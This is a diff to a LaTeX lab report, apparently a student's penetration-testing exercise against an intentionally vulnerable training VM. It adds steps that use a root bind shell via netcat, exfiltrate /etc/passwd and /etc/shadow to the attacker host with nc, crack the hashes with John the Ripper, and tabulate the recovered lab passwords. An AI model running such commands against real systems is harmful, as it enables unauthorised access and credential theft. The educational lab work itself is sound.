@@ -93,16 +93,25 @@
     % Activity 5
     \item By using \texttt{nc 192.168.56.3 1524} you can connect to the afformentioned Bind Shell, logging in as root.\newline
     
-    In the folder \texttt{/home/msfadmin/vulnerable} you can find a lot of keys and passwords, as shown here:
+    In the folder \texttt{/home/msfadmin/vulnerable}, you can find the configuration files and scripts for some of the applications, some including passwords.\\
+    I was only able to find, in \texttt{samba/3.0.6/jduck-build-stuff.tar.gz/samba-common.config}, the pasword \texttt{guest:smbpasswd}.\newline
+
+    On the \texttt{/etc/paswd} and \texttt{/etc/shadow} files you can find most of the passwords of a Linux system.\\
+    In order to transfer those files, I used \texttt{netcat -l 9899 > [file]} on the attacker machine and \texttt{nc -w 2 192.168.56.4 9899 < [file]} on the target machine.\newline
+    By using JohnTheRipper (the \texttt{$1$} showed MD5 format), I was able to crack the following ones:
+
+
     \begin{table}[!h]
         \centering
-        \begin{tabular}{|c|c|c|}
+        \begin{tabular}{|c|c|c|c|}
         \hline
-        \textbf{Location} & \textbf{Password} & \textbf{Description} \\ \hline
-        samba/3.0.6/jduck-build-stuff.tar.gz/samba-common.config & guest:smbpasswd &                      \\ \hline
-                          &                   &                      \\ \hline
-                          &                   &                      \\ \hline
-                          &                   &                      \\ \hline
+        \textbf{User}     & \textbf{Password}  & \textbf{Program}             & \textbf{Description}     \\ \hline
+        \texttt{sys}      & \texttt{batman}    & \texttt{/dev}                &  sys                     \\ \hline
+        \texttt{klog}     & \texttt{123456789} & \texttt{/home/klog}          &  -                       \\ \hline
+        \texttt{msfadmin} & \texttt{msfadmin}  & \texttt{/home/msfadmin}      & msfadmin                 \\ \hline
+        \texttt{postgres} & \texttt{postgres}  & \texttt{/var/lib/postgresql} & PostgreSQL administrator \\ \hline
+        \texttt{user}     & \texttt{user}      & \texttt{/home/user}          & just a user 111          \\ \hline
+        \texttt{service}  & \texttt{service}   & \texttt{/home/service}       & -                        \\ \hline
         \end{tabular}
     \end{table}
 
